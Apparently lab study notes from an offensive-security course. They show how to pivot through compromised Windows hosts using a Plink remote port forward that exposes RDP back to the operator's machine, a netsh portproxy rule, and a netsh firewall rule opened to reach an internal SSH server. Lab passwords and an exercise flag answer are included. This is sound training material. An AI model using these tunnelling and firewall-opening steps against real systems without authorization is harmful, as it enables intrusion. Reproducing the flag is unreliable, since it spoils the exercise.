the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "admin".
Server refused to allocate pty
Linux labhost 6.4.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.4.11-1kali1 (2023-08-21) x86_64
```
*In much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be:* `cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7`.

We can confirm that port has opened with `ss`
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ sudo ss -ntplu                                             
[sudo] password for operator: 
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=5270,fd=312))                                                      
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=5270,fd=250))                                                      
udp      UNCONN    0         0                  0.0.0.0:54691            0.0.0.0:*        users:(("openvpn",pid=6801,fd=3))                                                       
tcp      LISTEN    0         128              127.0.0.1:9833             0.0.0.0:*        users:(("sshd",pid=9349,fd=7))                                                          
tcp      LISTEN    0         1                127.0.0.1:61553            0.0.0.0:*        users:(("autossh",pid=4992,fd=3))                                                       
tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:(("sshd",pid=8675,fd=3))                                                          
tcp      LISTEN    0         5                  0.0.0.0:80               0.0.0.0:*        users:(("python3",pid=7212,fd=3))                                                       
tcp      LISTEN    0         128                   [::]:22                  [::]:*        users:(("sshd",pid=8675,fd=4))                                                          
tcp      LISTEN    0         10                       *:3389                   *:*        users:(("gnome-remote-de",pid=2860,fd=15)) 
```
- Port 9833 has opened on our lo iface.

We can now conn to port 9983 on our Kali lo iface with `xfreerdp` as the `rdp_admin` user.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```
- The conn through the Plink remote port forward succeeds.

###### Exercises

Follow the steps in this section to gain an RDP connection to MULTISERVER03. What's the flag found in flag.txt file on the rdp_admin's desktop?
```powershell
C:\Users\rdp_admin>cd \Users\rdp_admin\Desktop\

C:\Users\rdp_admin\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7CB9-7496

 Directory of C:\Users\rdp_admin\Desktop

11/12/2023  11:43 AM    <DIR>          .
11/12/2023  12:41 PM    <DIR>          ..
11/12/2023  11:43 AM                78 flag.txt
               1 File(s)             78 bytes
               2 Dir(s)   7,585,792,000 bytes free

C:\Users\rdp_admin\Desktop>type flag.txt
OS{333c7e7177522897ece09dafdde02d9a}
```


##### Netsh

There is a native method to create a port forward on Windows worth exploring, the built in firewall configuration tool [Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh), also known as *Network Shell*.  We can use it to set up a port forward.
- [portproxy](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy)
- [subcontext](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts#subcontexts)
- Both within the [interface context](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts)
Netsh requires admin to create a port forward on Win, it can be useful in some restrictive situations.

Consider a slight modification of the previous scenario.  MULTISERVER03 is serving its web app on TCP port 80, facing the perimeter.  CONFLUENCE01 is no longer accessible on the WAN iface.  CONFLUENCE01 is no longer on WAN.  In this case, MULTISERVER03 also allows inbound RDP.

We want to SSH into PGDATABASE01 directly, we need to create a port forward on MULTISERVER03 listening on WAN iface and forwarding packets to PGDATABASE01 SSH port.
*The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.*

To setup the port forward we will RDP directly into MULTISERVER03.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:$VM1
```
- Open `cmd.exe` as admin in our RDP session.

Run Netsh.
- `netsh interface`
 - To `add` a `portproxy` rule from an IPv4 listener that is forwarded to an IPv4 port `v4tov4`
 - Listening on external ifaces `listenport=2222 listenaddress=192.168.234.64`
```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.234.64 connectport=22 connectaddress=10.4.234.215
```

We can confirm listening port 2222 is active with `netstat`
```powershell
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.234.64:2222    0.0.0.0:0              LISTENING
```

We can also confirm the port forward by issuing `show all` in `netsh interface portproxy` subcontext.
```powershell
C:\Windows\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.234.64  2222        10.4.234.215    22
```
- The port is listening and the port forward is setup.

We still have a problem, if we check port 2222 with nmap we see it is filtered.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
└─$ sudo nmap -sS $VM1 -Pn -n -p 2222                          
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 13:50 PST
Nmap scan report for 192.168.234.64
Host is up.

PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
```
- Win Firewall is likely blocking inbound port 2222.

We need to open a hole in the firewall of MULTISERVER03.
*We'll also need to remember to plug that hole as soon as we're finished with it!*

Using `netsh advfirewall firewall` subcontext to create the hole, use the `add rule` command, and name the rule `port_forward_ssh_2222`.  Best to use a memorable name as we will need it to delete the rule later.
- `allow`
	- `localport=2222`
	- `localip=192.168.234.64`
	- `dir=in`
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.234.64 localport=2222 action=allow
```

Recheck with nmap.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
└─$ sudo nmap -sS $VM1 -Pn -n -p 2222
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 14:05 PST
Nmap scan report for 192.168.234.64
Host is up (0.076s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```
- We can now SSH to port 2222 on MULTISERVER03 as if we are connecting to port 22 of PGDATABASE01.
 - Password `sqlpass123`
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-netsh]
└─$ ssh -o PubKeyAuthentication=no database_admin@192.168.234.64 -p2222
database_admin@192.168.234.64's password: 
Permission denied, please try again.
database_admin@192.168.234.64's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 12 Nov 2023 10:10:21 PM UTC

  System load:  0.0               Processes:               213
  Usage of /:   80.4% of 6.79GB   Users logged in:         0
  Memory usage: 13%               IPv4 address for ens192: 10.4.234.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.234.254


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$
```
*Once we're done with the connection, we need to remember to delete the firewall rule we just created.*

We can delete the rule with `netsh advfirewall firewall`
```powershell
C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```

We can also delete the port forward with `netsh interface` subcontext to `del` the `portproxy` by referencing the forwarding type `v4tov4`, the `listenaddress`, and `listenport`.
```
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.234.64
```
*Most Windows Firewall commands have PowerShell equivalents with commandlets like New-NetFirewallRule and Disable-NetFirewallRule. However, the netsh interface portproxy command doesn't. For simplicity, we've stuck with pure Netsh commands in this section. However, for a lot of Windows Firewall enumeration and configuration, PowerShell is extremely useful. You may wish to experiment with it while completing the exercises for this section.*
